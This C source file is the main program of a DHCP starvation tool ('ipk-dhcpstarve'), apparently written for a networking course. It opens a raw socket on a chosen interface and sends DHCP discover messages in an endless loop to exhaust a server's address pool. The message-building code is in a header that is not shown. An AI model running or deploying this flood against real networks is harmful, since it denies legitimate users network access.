#include "libs.h"
#include "msg.h"

/**
 * @brief Function correctly end application and releas resources
 * 
 */
void sighandler(int);

/**
 * @brief Function check correctnes of arguments
 * 
 * @param argc	 
 * @param argv 
 * @param interface return interface name from cmd through this pointer 
 * @return true when eth all right
 * @return false when error is occured 
 */
bool check_arguments(int argc, char *argv[], char **interface);

/**
 * @brief Print usage 
 * 
 */
void usage();

int sockfd;


int main(int argc, char *argv[]) {
	
	char *ifname;
	if(!(check_arguments(argc,argv,&ifname))) {
		usage();
		return 1;
	}
	
	signal(SIGINT, sighandler);
		
	srand(time(NULL));

	/* Open RAW socket to send on */
	if((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1) {
		fprintf(stderr,"ERROR: Nepodarilo sa otvorit socket!\n");
		return 1;
	}
	
	/* Get the index of the interface to send on */
	struct ifreq if_idx;
	
	memset(&if_idx, 0, sizeof(struct ifreq));
  	strncpy(if_idx.ifr_name, ifname, sizeof(if_idx.ifr_name));
  	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
		fprintf(stderr,"ERROR: Nepodarilo sa ziskat index rozhrania!\n");
		return 1;
	}
	int ifindex = if_idx.ifr_ifindex;
	
	/* Get the MAC adress of the interface to send on */
	struct ifreq if_mac;
	
	memset(&if_mac, 0, sizeof(struct ifreq));
  	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ-1);
  	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
  	fprintf(stderr,"ERROR: Nepodarilo sa ziskat MAC adresu rozhrania\n");
		return 1;
	}
	unsigned char ifmac[ETH_ALEN];
	memcpy(ifmac, if_mac.ifr_hwaddr.sa_data, ETH_ALEN);
	
	while(1) {
		send_discover_msg(sockfd, ifindex, ifmac);
	}

	return 0;
}

void sighandler(int signum) {
	//printf("Caught signal %d, coming out...\n", signum);
	close(sockfd);
	exit(0);
}

bool check_arguments(int argc, char *argv[], char **interface) {
	int opt, rep = 0;
	if(argc != 3) return false;
	while( (opt = getopt(argc, argv, "i:")) != -1 ) {
		switch(opt) {
			case 'i':
				if(++rep > 1) return false;
				*interface = optarg;
				break;
			default:
				return false;
		}
	}
	return true;
}

void usage() {
	fprintf(stderr,"Usage: ./ipk-dhcpstarve -i interface\n");
	fprintf(stderr,"\tinterface\tthe name of the interface to send on\n");
}
